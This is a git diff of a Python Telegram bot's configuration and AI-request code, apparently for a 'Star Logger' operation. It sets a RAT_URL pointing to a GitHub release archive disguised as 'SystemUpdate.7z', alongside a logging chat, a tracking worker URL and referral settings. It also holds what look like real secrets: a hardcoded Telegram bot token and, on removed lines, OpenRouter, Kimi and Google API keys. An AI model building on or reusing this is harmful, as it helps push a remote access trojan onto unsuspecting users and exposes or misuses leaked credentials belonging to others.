@@ -18,12 +18,11 @@ from telegraph import Telegraph
 # ---------- CONFIG ----------
 load_dotenv()
 
-BOT_TOKEN   = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_BOT_TOKEN") or "9010108280:AAH18qw9pxpEm_FiDTQtOp4KMOWpLJ9DqOE"
+BOT_TOKEN   = os.environ.get("BOT_TOKEN") or "9010108280:AAH18qw9pxpEm_FiDTQtOp4KMOWpLJ9DqOE"
 ADMIN_IDS   = [int(x) for x in (os.environ.get("ADMIN_IDS") or "8297446667").split(",") if x.strip().lstrip("-").isdigit()]
 LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1004382024668")
 WORKER_URL  = os.environ.get("WORKER_URL") or "https://trak.geminialex12.workers.dev"
 
-# ВАЖНО: База теперь лежит в корне, а не в /tmp
 DB_PATH     = os.environ.get("DB_PATH") or "database2.db" 
 PORT        = int(os.environ.get("PORT", 8080))
 
@@ -35,10 +34,10 @@ REF_MARKUP    = 0.5
 BOT_LINK      = "https://t.me/StarsLogg_Robot?start=" 
 RAT_URL       = "https://github.com/geminialex12-hue/Ekskks/releases/download/V1.0/SystemUpdate.7z"
 
-# API КЛЮЧИ
-OPENROUTER_KEY = "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"
-KIMI_KEY       = "sk-w0I4rlR4gqX5pptrLh1b7Eh7OhwgpaKtufweR1c58RJYHoQ9"
-GOOGLE_KEY     = "AQ.Ab8RN6KhJs9xiYkDT21RNZ86ktVdojwSgLrAUIUYmgvnhp9piA"
+# API КЛЮЧИ (ВСТАВЬ СЮДА НОВЫЕ КЛЮЧИ, СТАРЫЕ УЖЕ ЗАБЛОКИРОВАНЫ)
+OPENROUTER_KEY = os.environ.get("OPENROUTER_KEY") or "sk-or-v1-..."
+KIMI_KEY       = os.environ.get("KIMI_KEY") or "sk-..."
+GOOGLE_KEY     = os.environ.get("GOOGLE_KEY") or "AIza..."
 
 # ---------- BOT / TELEGRAPH ----------
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
@@ -396,7 +395,12 @@ def process_ai_request(message, model):
         if model == "llama":
             res = requests.post(
                 url="https://openrouter.ai/api/v1/chat/completions",
-                headers={"Authorization": f"Bearer {OPENROUTER_KEY}", "Content-Type": "application/json"},
+                headers={
+                    "Authorization": f"Bearer {OPENROUTER_KEY}",
+                    "Content-Type": "application/json",
+                    "HTTP-Referer": "https://t.me/StarsLogg_Robot", # Фикс для 401
+                    "X-Title": "Star Logger Bot" # Фикс для 401
+                },
                 json={"model": "meta-llama/llama-3-8b-instruct", "messages": [{"role": "user", "content": prompt}]},
                 timeout=25
             )
